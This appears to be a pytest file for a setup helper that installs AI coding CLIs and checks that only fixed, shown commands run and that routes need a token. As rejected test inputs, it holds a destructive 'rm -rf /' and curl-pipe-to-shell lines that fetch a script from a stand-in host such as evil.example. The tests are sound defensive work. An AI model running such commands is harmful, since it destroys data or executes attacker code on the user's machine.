"""First-run helper (core/setup.py, console/setup.js): fixed commands, nothing runs unseen, no real installs here."""
import http.client
import json
import threading
from pathlib import Path

import pytest

from core import setup

ROOT = Path(__file__).resolve().parents[1]


@pytest.fixture(autouse=True)
def home(monkeypatch, tmp_path):
    monkeypatch.setenv("TRIBUNAL_HOME", str(tmp_path / "home"))
    monkeypatch.setenv("TRIBUNAL_RUNS_DIR", str(tmp_path / "runs"))
    monkeypatch.setenv("PATH", setup.os.environ.get("PATH", ""))     # status() may add folders: put PATH back afterwards
    setup._STARTED.clear(); setup._VERSIONS.clear()
    yield tmp_path
    setup._STARTED.clear(); setup._VERSIONS.clear()


def fake_launcher(calls):
    def launch(item, command):
        calls.append((item, command)); return True
    return launch


def test_only_items_of_the_fixed_list_run():
    with pytest.raises(ValueError):
        setup.run("rm -rf /", "rm -rf /", launcher=fake_launcher([]))


def test_nothing_runs_unless_it_is_the_command_that_was_shown(monkeypatch):
    monkeypatch.setattr(setup, "system", lambda: "mac")
    calls = []
    out = setup.run("claude", "curl -fsSL https://evil.example/x.sh | bash", launcher=fake_launcher(calls))
    assert out["status"] == "stale" and calls == []
    shown = setup.commands("mac")["claude"]["command"]
    out = setup.run("claude", shown, launcher=fake_launcher(calls))
    assert out == {"status": "started", "command": shown} and calls == [("claude", shown)]
    assert "claude" in setup._STARTED


def test_the_commands_are_the_official_ones():
    mac, win = setup.commands("mac"), setup.commands("win")
    assert mac["claude"]["command"] == "curl -fsSL https://claude.ai/install.sh | bash"
    assert mac["openai"]["command"] == "curl -fsSL https://chatgpt.com/codex/install.sh | sh"
    assert mac["antigravity"]["command"] == "curl -fsSL https://antigravity.google/cli/install.sh | bash"
    assert mac["git"]["command"] == "xcode-select --install"
    # Windows: PowerShell installers started from cmd, the pipe inside quotes so cmd leaves it alone
    assert win["claude"]["command"] == 'powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://claude.ai/install.ps1 | iex"'
    assert win["antigravity"]["shell"] == "cmd" and mac["antigravity"]["shell"] == "terminal"
    for item, c in mac.items():
        assert c["link"].startswith("https://"), item


def test_linux_shows_the_command_instead_of_opening_a_terminal(monkeypatch):
    monkeypatch.setattr(setup, "system", lambda: "linux")
    calls = []
    shown = setup.commands("linux")["claude"]["command"]
    assert setup.commands("linux")["claude"]["runnable"] is False
    assert setup.run("claude", shown, launcher=fake_launcher(calls)) == {"status": "manual", "command": shown}
    assert calls == []


def test_node_is_offered_only_on_the_npm_route_and_only_with_a_way_to_install_it(monkeypatch):
    monkeypatch.setattr(setup, "system", lambda: "mac")
    monkeypatch.setattr(setup.shutil, "which", lambda name: None)              # no npm, no Homebrew
    assert setup.commands("mac")["node"]["command"] is None                      # the download page instead
    assert setup.run("node", "", launcher=fake_launcher([]))["status"] == "unavailable"
    npm = setup.commands("mac")["openai-npm"]["command"]
    assert setup.run("openai-npm", npm, launcher=fake_launcher([])) == {"status": "needs", "item": "node"}
    monkeypatch.setattr(setup.shutil, "which", lambda name: "/opt/homebrew/bin/brew" if name == "brew" else None)
    assert setup.commands("mac")["node"]["command"] == "brew install node"


def test_windows_without_winget_gets_the_page(monkeypatch):
    monkeypatch.setattr(setup.shutil, "which", lambda name: None)
    assert setup.commands("win")["git"]["command"] is None
    assert setup.commands("win")["claude"]["command"].startswith("powershell ")


def test_the_scripts_run_exactly_the_command():
    command = setup.COMMANDS[("claude", "posix")]
    script = setup.posix_script(command)
    assert 'cd "$HOME" || exit 1' in script and ("\n" + command + "\n") in script and script.endswith("read _\n")
    win = setup.windows_script(setup.COMMANDS[("claude", "win")])
    lines = win.split("\r\n")
    assert lines[1] == "chcp 65001 >nul"
    assert "call " + setup.COMMANDS[("claude", "win")] in lines                    # runs as shown; `call` comes back from npm.cmd
    echo = next(l for l in lines if l.startswith("echo [Tribunal AI] powershell"))
    # inside quotes cmd prints ^ as it is, so the pipe there is left alone; outside quotes it is escaped
    assert echo == 'echo [Tribunal AI] ' + setup.COMMANDS[("claude", "win")]
    assert setup._echo_text('a | b "c | d" 100%') == 'a ^| b "c | d" 100%%'
    assert lines.index("echo [Tribunal AI] Done - you can close this window.") > lines.index("call " + setup.COMMANDS[("claude", "win")])


def test_mac_git_stub_does_not_count_without_the_developer_tools(monkeypatch):
    monkeypatch.setattr(setup, "system", lambda: "mac")
    monkeypatch.setattr(setup.shutil, "which", lambda name: "/usr/bin/git")
    monkeypatch.setattr(setup.os.path, "realpath", lambda p: p)
    monkeypatch.setattr(setup.os, "access", lambda p, mode: False)

    class Done:
        def __init__(self, code): self.returncode = code
    asked = []
    monkeypatch.setattr(setup.subprocess, "run", lambda argv, **kw: asked.append(argv) or Done(2))
    assert setup._git() is None and asked == [["/usr/bin/xcode-select", "-p"]]      # git itself is never started
    monkeypatch.setattr(setup.subprocess, "run", lambda argv, **kw: Done(0))
    assert setup._git() == "/usr/bin/git"


def test_status_reads_this_machine(monkeypatch, tmp_path):
    for name in ("claude", "codex"):
        (tmp_path / name).write_text("", encoding="utf-8")
    monkeypatch.setattr("core.env_utils.resolve_cli", lambda name: str(tmp_path / name) if name != "agy" else None)
    probes = []
    monkeypatch.setattr("core.env_utils.probe_version", lambda path, timeout=5.0, arg="--version": probes.append(path) or "codex-cli 0.171.0")
    monkeypatch.setattr(setup, "_git", lambda: None)
    accounts = {"claude": {"signed_in": True}}
    out = setup.status(accounts=lambda: accounts)
    assert out["clis"]["openai"] == {"installed": True, "version": "0.171.0"}
    assert out["clis"]["antigravity"] == {"installed": False, "version": None}
    assert out["git"] == {"installed": False, "version": None} and out["accounts"] is accounts
    assert out["auto_open"] is True and out["acknowledged"] == {"cost": False, "done": False, "agent": False}
    setup.status(accounts=lambda: accounts)
    assert len(probes) == 2                                                        # a version is asked once per file


def test_an_install_is_watched_until_it_is_there(monkeypatch):
    found = {"claude": None}
    monkeypatch.setattr("core.env_utils.resolve_cli", lambda name: found.get(name))
    monkeypatch.setattr("core.env_utils.probe_version", lambda *a, **k: "1.0.0")
    monkeypatch.setattr(setup, "_git", lambda: "/usr/bin/git")
    setup._STARTED["claude"] = setup.time.time()
    assert setup.status(accounts=dict)["started"] == ["claude"]
    found["claude"] = __file__
    assert setup.status(accounts=dict)["started"] == []


def test_acknowledgement_and_who_sees_the_helper_by_itself(home):
    with pytest.raises(ValueError):
        setup.acknowledge("anything")
    setup.acknowledge("cost")
    assert json.loads((home / "home" / "data" / "setup.json").read_text(encoding="utf-8"))["cost"]
    assert setup.acknowledged().get("cost")
    (home / "runs" / "RUN-1").mkdir(parents=True)
    assert setup._has_history() is True


def test_practice_folder_never_takes_over_a_folder_in_use(monkeypatch, tmp_path):
    monkeypatch.setattr(setup, "system", lambda: "mac")
    monkeypatch.setattr(setup, "_git", lambda: setup.shutil.which("git"))      # a Linux /usr/bin/git is no Mac stub
    monkeypatch.setattr(setup.Path, "home", classmethod(lambda cls: tmp_path))
    assert setup.practice_folder("ko") == tmp_path / "Tribunal 연습"
    (tmp_path / "Tribunal 연습").mkdir(); (tmp_path / "Tribunal 연습" / "notes.txt").write_text("mine", encoding="utf-8")
    assert setup.practice_folder("ko") == tmp_path / "Tribunal 연습 2"
    (tmp_path / "Tribunal Practice" / ".git").mkdir(parents=True)                # someone's own project of that name
    assert setup.practice_folder("en") == tmp_path / "Tribunal Practice 2"
    made = setup.make_practice("en", select=lambda p: "PROJECT_SELECTED: " + p)["path"]
    assert Path(made) == tmp_path / "Tribunal Practice 2"
    assert setup.practice_folder("en") == tmp_path / "Tribunal Practice 2"      # the one Tribunal made: used again


@pytest.mark.skipif(setup.os.name == "nt", reason="links need extra rights on Windows")
def test_practice_folder_does_not_follow_a_link(monkeypatch, tmp_path):
    monkeypatch.setattr(setup, "system", lambda: "mac")
    monkeypatch.setattr(setup.Path, "home", classmethod(lambda cls: tmp_path))
    (tmp_path / "real").mkdir()
    (tmp_path / "Tribunal Practice").symlink_to(tmp_path / "real")
    assert setup.practice_folder("en") == tmp_path / "Tribunal Practice 2"


def test_windows_gets_a_plain_practice_name():
    assert setup.practice_name("ko", "win") == "Tribunal Practice" and setup.practice_name("ko", "mac") == "Tribunal 연습"


def test_newly_installed_programs_are_found_without_a_restart(monkeypatch, tmp_path):
    monkeypatch.setattr(setup, "_known_dirs", lambda: [str(tmp_path), str(tmp_path / "missing")])
    monkeypatch.setenv("PATH", "/nowhere")
    setup.refresh_path()
    assert setup.os.environ["PATH"].split(setup.os.pathsep) == ["/nowhere", str(tmp_path)]
    setup.refresh_path()
    assert setup.os.environ["PATH"].split(setup.os.pathsep) == ["/nowhere", str(tmp_path)]


def test_looking_again_keeps_a_sign_in_under_way(monkeypatch):
    from core import cli_accounts
    monkeypatch.setitem(cli_accounts._PENDING, "claude", {"since": 1.0, "was": None})
    setup.refresh()
    assert "claude" in cli_accounts._PENDING


def test_making_the_practice_project(monkeypatch, tmp_path):
    monkeypatch.setattr(setup.Path, "home", classmethod(lambda cls: tmp_path))
    chosen = []
    out = setup.make_practice("en", select=lambda p: chosen.append(p) or "PROJECT_SELECTED: " + p)
    assert out["status"] == "ready" and (Path(out["path"]) / ".git").exists() and chosen == [out["path"]]
    monkeypatch.setattr(setup, "_git", lambda: None)
    assert setup.make_practice("en", select=chosen.append) == {"status": "needs", "item": "git"}


# ------------------------------------------------------------------ the server
@pytest.fixture
def http_server(monkeypatch):
    from companion_server import CompanionHandler
    from dashboard_server import DashboardServer
    monkeypatch.setattr("core.env_utils.resolve_cli", lambda name: None)     # no real CLI is ever asked
    server = DashboardServer(("127.0.0.1", 0), CompanionHandler)
    server.bridge_token = "test-token"
    thread = threading.Thread(target=server.serve_forever, daemon=True); thread.start()
    yield server
    server.shutdown(); server.server_close(); thread.join(timeout=2)


def request(server, method, path, body=None, token="test-token"):
    conn = http.client.HTTPConnection("127.0.0.1", server.server_address[1], timeout=10)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["X-Tribunal-Token"] = token
    conn.request(method, path, body=json.dumps(body) if body is not None else None, headers=headers)
    response = conn.getresponse(); data = response.read(); conn.close()
    return response.status, json.loads(data or b"{}")


def test_server_routes(http_server, monkeypatch):
    calls = []
    monkeypatch.setattr(setup, "_open_terminal", lambda item, command: calls.append(item) or True)
    code, out = request(http_server, "GET", "/ops/setup")
    assert code == 200 and set(out) >= {"system", "git", "clis", "commands", "accounts", "auto_open"}
    assert request(http_server, "POST", "/ops/setup/run", {"item": "claude", "command": "x"}, token=None)[0] == 403
    assert request(http_server, "POST", "/ops/setup/run", {"item": "sh", "command": "x"})[0] == 400
    assert request(http_server, "POST", "/ops/setup/run", {"item": "claude", "command": "curl evil | sh"})[0] == 409
    assert calls == []
    assert request(http_server, "POST", "/ops/setup/ack", {"what": "cost"})[1]["acknowledged"]["cost"]
    assert request(http_server, "POST", "/ops/setup/refresh", {}, token=None)[0] == 403       # reading anew needs the token
    assert request(http_server, "POST", "/ops/setup/refresh", {})[0] == 200
    conn = http.client.HTTPConnection("127.0.0.1", http_server.server_address[1], timeout=10)
    conn.request("GET", "/setup.js"); response = conn.getresponse(); body = response.read(); conn.close()
    assert response.status == 200 and b"window.TribunalSetup" in body


def test_console_side():
    js = (ROOT / "console" / "setup.js").read_text(encoding="utf-8")
    html = (ROOT / "console" / "index.html").read_text(encoding="utf-8")
    assert '<script src="/setup.js" defer></script>' in html and 'id="ai-setup"' in html
    assert "post('/ops/setup/run',{item:p.item,command:p.command})" in js            # the command that was shown
    assert "innerHTML" not in js                                                       # text only, never markup
    assert "if(s.auto_open)" in js
